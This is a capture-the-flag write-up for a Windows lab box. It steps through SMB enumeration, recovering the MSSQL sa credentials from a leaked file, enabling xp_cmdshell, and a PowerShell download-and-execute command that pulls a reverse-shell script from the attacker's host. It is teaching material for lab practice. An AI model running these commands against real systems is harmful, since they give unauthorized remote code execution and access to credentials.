## üìù Description

As is common in real-life Windows pentests, we begin this box with pre-given credentials:

**Username:** `rose`  
**Password:** `KxEPkKe6R8su`

---

## üîç Enumeration

We'll start with a basic **Nmap** scan using the following command:

```bash
nmap -sC -sV -sT 10.10.11.51
```
![nmap](../pics/nmap.png)
we will notice this valuable info 
```
DC01.sequel.htb
1433/tcp open  Microsoft SQL Server
389/tcp  open  LDAP
88/tcp   open  Microsoft Windows Kerberos
445/tcp  open  Microsoft-ds SMB
```
## üìÅ SMB Enumeration

Let‚Äôs enumerate the **SMB protocol** using the credentials we obtained earlier.

We'll use a tool called **`smbmap`** to list accessible shares.

### üõ†Ô∏è Command:

```bash
smbmap -u rose -p KxEPkKe6R8su -H sequel.htb
```

```plaintext
[+] IP: 10.10.11.51:445   Name: sequel.htb   Status: Authenticated

    Disk                   Permissions    Comment
    ----                   -----------    -------
    Accounting Department  READ ONLY
    ADMIN$                 NO ACCESS      Remote Admin
    C$                     NO ACCESS      Default share
    IPC$                   READ ONLY      Remote IPC
    NETLOGON               READ ONLY      Logon server share
    SYSVOL                 READ ONLY      Logon server share
    Users                  READ ONLY
    
```
Let's try to connect to smb and check accounting department 
![](../pics/files.png)
we found 2 files and we downloaded them to our local machine using "get" command in smb client

now lets check the type of these files 
![](../pics/filess.png)
we found out its not spreedshet its comprised file so after extracting the files and check them out we got these credentials:
![](../pics/xml%20.png)
we notice **sa** credentials
```
sa is the defult admin account for connecting and managing the MSSQL Database
``` 
### üß© Attempting MSSQL Access with `impacket-mssqlclient`

We try to connect to the MSSQL service using **default `sa` credentials**.

### üõ†Ô∏è Command:

```bash
impacket-mssqlclient escapetwo.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
```

Cool now we have to enable xp_cmdshell to be able to execute commands on the system we can enable it by : 
```bash
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
 ```
 ![](../pics/sqls.png)
 okay let's get reverse shell on the machine 
 first we will need to craft our powershell script to give us reverse shell
 ![](../pics/shell.png)
 then we will run python server and make the machine to download it by this command :
 ```powershell
 EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.16.2/shellx.ps1'')"';
```
Boom we got reverse shell now :
![](../pics/frommachine.png)
after some digging i found configuration file leaking sql_svc information 
```bash
Wqxxxxxxxxxxxxxxxx
```
Also i found user called ryan : 
![](../pics/ryan.png)
Lets use these credintials to login and try to get the user flag : 
![](../pics/userflag.png)
we got the user flag now
